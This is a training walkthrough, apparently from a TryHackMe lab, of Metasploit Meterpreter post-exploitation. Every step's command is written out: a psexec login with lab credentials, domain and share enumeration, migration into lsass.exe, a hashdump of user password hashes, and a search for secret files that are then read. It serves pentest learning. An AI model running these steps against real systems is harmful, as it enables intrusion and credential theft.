# Metasploit Meterpreter: Post-Exploitation

This guide explores the use of Metasploit’s Meterpreter for post-exploitation activities, emphasizing enumeration, file retrieval, and credential extraction. It also integrates the provided questions to enhance understanding of each step.

## Step 1: Initial Access with psexec Module
Objective: Gain access to the target system using the SMB psexec module

1.Load the psexec Module:

I initiated the attack using the SMB psexec module:

- use exploit/windows/smb/psexec

2.Set Necessary Options:

I configured the essential settings, including the target host (RHOST), SMB credentials (SMBUser and SMBPass), and the local IP (LHOST):

- set RHOST 10.10.129.7
- set SMBUser ballen
- set SMBPass Password1
- set LHOST 10.10.13.1

3.Run the Exploit:

After configuring, I launched the exploit:

- run

This successfully opened a Meterpreter session on the target machine.

## Step 2: Retrieving System Information 
Objective: Identify key details of the compromised system.

1.Execute System Info Command:

I ran the following command to gather information:

- sysinfo

The output confirmed the computer name as ACME-TEST, and the domain as FLASH, running on x64 architecture.

## Step 3: Domain Enumeration
Objective: Enumerate details about the domain and its controller.

1.Use Domain Enumeration Module:

I loaded the enum_domain module:

- use post/windows/gather/enum_domain

Configured it with the active session:

- set session 1

2.Run the Enumeration:

I executed the module:

- run

The output provided details including the domain (FLASH.local), the NetBIOS name (FLASH), and the domain controller (ACME-TEST).

## Step 4: Enumerating SMB Shares
Objective: Identify shared resources on the compromised system.

1.Search and Use the SMB Share Enumeration Module:

I searched for the relevant module:

- search enum_shares
- use post/windows/gather/enum_shares

2.Set and Execute:

Set the session:

- set session 1

Ran the module to gather share details:

- run

The output displayed shares like SYSVOL, NETLOGON, and a custom share speedster.

## Step 5: Process Management and Migration
Objective: List processes and migrate Meterpreter to a stable process.

1.List All Processes:

To view active processes, I executed:

- ps

I identified critical processes such as lsass.exe.

2.Migrate to a Stable Process:

I chose lsass.exe (PID: 772) for migration:

- migrate 772

This migration stabilizes the session and may grant access to sensitive information.

## Step 6: Dumping Password Hashes
Objective: Extract password hashes from the compromised system.

1.Run the Hash Dump Command:

Using Meterpreter:

- hashdump

The command output hashes for several users including Administrator, ballen, and jchambers.

## Step 7: File Search and Retrieval
Objective: Locate and read sensitive files on the system.

1.Search for Files:

I searched for a specific file:

- search -f secrets.txt

The file was located at:

- c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt

2.Read File Contents:

I accessed the file using:

- cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"

## Step 8: Further File Discovery
Objective: Search for additional sensitive files.

1.Search for Another File:

I ran another search:

- search -f realsecret.txt

Found the file at:

- c:\inetpub\wwwroot\realsecret.txt

2.Access the File:

Read the file:

- cat "c:\inetpub\wwwroot\realsecret.txt"


---------------------------------------------

Summary
This walkthrough demonstrates the effective use of Metasploit's Meterpreter for advanced post-exploitation. Each step showcases the versatility of the tool, from enumeration and credential extraction to file system exploration and data retrieval. Mastering these techniques is essential for anyone aspiring to become a proficient pentester.

Key Takeaways:

Exploiting SMB services and valid credentials can lead to significant access in a target environment.
Post-exploitation tasks such as process migration, domain enumeration, and hash dumping provide deeper control and insight.
The ability to search for and retrieve files reveals the true value of accessing sensitive data

For further resources:

Metasploit Framework Documentation: In-depth details and guidance.
TryHackMe Metasploit Room: Hands-on exercises to practice Metasploit skills.























